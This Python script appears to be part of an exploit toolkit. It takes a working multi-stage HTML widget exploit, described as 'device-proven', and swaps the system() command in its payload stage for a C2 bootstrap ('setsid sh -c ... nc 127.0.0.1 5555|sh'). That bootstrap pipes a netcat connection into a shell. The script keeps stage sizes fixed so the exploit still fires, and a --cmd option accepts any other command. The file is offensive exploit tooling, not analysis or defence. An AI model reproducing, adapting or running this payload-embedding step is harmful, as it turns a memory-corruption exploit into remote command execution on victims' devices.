#!/usr/bin/env python3
# Build the C2 variant of the universal c2560s widget (device and host twin).
#
# The shipped device final (device/widget/c2560_final_c2560s_72929.html) is
# device-proven on 72929 (proof 185, uid=10346) and its stage A/B/C geometry
# is probe-SAFE at B=7,182.  This generator keeps stage A and stage C
# byte-identical and rewrites ONLY the system() command literal in stage B.
#
# Stage B length is preserved at 7,182 bytes in both variants:
#   * device source: the command field is 50 bytes; the 44-char bootstrap is
#     padded with 6 trailing spaces (shell-inert), the loop count stays 50.
#   * host twin: the source command is 39 bytes; a 44-char command grows the
#     literal by 5, so 5 bytes are trimmed from the trailing /*...*/ comment.
#     The twin exists because the device endgame is calibrated for the device
#     heap (on the host it stops at HF ERR NOANCHOR by design).
#
# The default command is the 44-char C2 bootstrap:
#   setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
#
# Usage:
#   python3 device/gen_c2_widget.py \
#       --src device/widget/c2560_final_c2560s_72929.html \
#       --out device/widget/c2560_final_c2560s_c2_72929.html
#   python3 device/gen_c2_widget.py \
#       --src device/widget/c2560_final_c2560s_host.html \
#       --out device/widget/c2560_final_c2560s_c2_host.html
import argparse
import hashlib
import os
import re
import subprocess
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
SRC_DEV = os.path.join(HERE, "widget", "c2560_final_c2560s_72929.html")
SRC_HOST = os.path.join(HERE, "widget", "c2560_final_c2560s_host.html")
CMD = "setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&"
CMD_MAX = 50
EXPECT_A = 2228
EXPECT_B = 7182
EXPECT_C = 408
MAX_RAW = 32768
MAX_ZLIB9 = 4096


def parts(html):
    return re.findall(r'<script id="(stage[ABC])">(.*?)</script>', html, re.S)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", default=SRC_DEV)
    ap.add_argument("--out", required=True)
    ap.add_argument("--cmd", default=CMD,
                    help="system() command (<=%d bytes; default: the C2 "
                         "loopback bootstrap)" % CMD_MAX)
    args = ap.parse_args()

    cmd = args.cmd
    if len(cmd) > CMD_MAX:
        raise SystemExit("command is %d bytes (limit %d)" % (len(cmd), CMD_MAX))
    if '"' in cmd:
        raise SystemExit("command must not contain a double quote (it is "
                         "embedded in a double-quoted JS literal)")
    if "\n" in cmd or "\x00" in cmd:
        raise SystemExit("command must be a single line without NUL")
    if subprocess.call(["sh", "-n", "-c", cmd]) != 0:
        raise SystemExit("command does not parse in sh")

    html = open(args.src, "r", encoding="utf-8").read()
    blocks = dict(parts(html))
    a, b, c = blocks["stageA"], blocks["stageB"], blocks["stageC"]
    if (len(a), len(b), len(c)) != (EXPECT_A, EXPECT_B, EXPECT_C):
        raise SystemExit("source A/B/C = %d/%d/%d, expected %d/%d/%d"
                         % (len(a), len(b), len(c),
                            EXPECT_A, EXPECT_B, EXPECT_C))

    m = re.search(r'[,;(]([A-Za-z_$][\w$]*)=0;\1<(\d+);\1\+\+\)'
                  r'([A-Za-z_$][\w$]*)\[\1\]=255&"([^"]*)"', b)
    if not m:
        raise SystemExit("system() command literal not found in stage B")
    var, old_n, buf, old = m.group(1), int(m.group(2)), m.group(3), m.group(4)
    if old_n != len(old):
        raise SystemExit("loop count %d != literal length %d" % (old_n, len(old)))

    # Pad with spaces when the command is shorter than the source field
    # (the trailing spaces are inert after the final '&'); when it is longer,
    # the loop and terminator grow and stage-B length is restored below.
    if len(cmd) <= old_n:
        lit, n = cmd + " " * (old_n - len(cmd)), old_n
    else:
        lit, n = cmd, len(cmd)

    # Rewrite exactly the lexer-matched command write: loop bound, literal
    # and (outside the match) the NUL terminator.  Anchoring on the match
    # avoids touching the many other `for(n=0;n<16384;n++)` loops.
    region = (b[m.start():m.start(2)] + str(n)
              + b[m.end(2):m.start(4)] + lit + b[m.end(4):m.end()])
    b2 = b[:m.start()] + region + b[m.end():]
    term_old = '%s[%d]=0' % (buf, old_n)
    term_new = '%s[%d]=0' % (buf, n)
    if b.count(term_old) != 1:
        raise SystemExit("expected exactly one %r, found %d"
                         % (term_old, b.count(term_old)))
    b2 = b2.replace(term_old, term_new, 1)

    # Restore the stage-B script length from the trailing comment padding.
    delta = len(b2) - len(b)
    if delta > 0:
        cm = list(re.finditer(r'/\*(.*?)\*/', b2))
        if not cm or len(cm[-1].group(1)) < delta:
            raise SystemExit("stage B would grow by %d and there is no "
                             "trailing comment padding to absorb it" % delta)
        last = cm[-1]
        body = last.group(1)[:-delta]
        b2 = b2[:last.start()] + "/*" + body + "*/" + b2[last.end():]
    if len(b2) != len(b):
        raise SystemExit("stage B length changed: %d != %d" % (len(b2), len(b)))

    html2 = html.replace(b, b2, 1)
    if html2 == html:
        raise SystemExit("replacement did not change the widget")
    pa, pb, pc = parts(html2)
    if pa[1] != a or pc[1] != c:
        raise SystemExit("stage A or C changed")

    raw = len(html2.encode("utf-8"))
    z = len(zlib.compress(html2.encode("utf-8"), 9))
    if raw > MAX_RAW or z > MAX_ZLIB9:
        raise SystemExit("widget too big: raw=%d zlib9=%d (limits %d/%d)"
                         % (raw, z, MAX_RAW, MAX_ZLIB9))
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(html2)
    print("%s raw=%d zlib9=%d A=%d B=%d C=%d cmd=%d/%d loop=%d md5=%s"
          % (args.out, raw, z, len(a), len(b2), len(c), len(cmd), CMD_MAX,
             n, hashlib.md5(html2.encode()).hexdigest()))
    print("embedded literal: %r" % lit)
    return 0


if __name__ == "__main__":
    sys.exit(main())
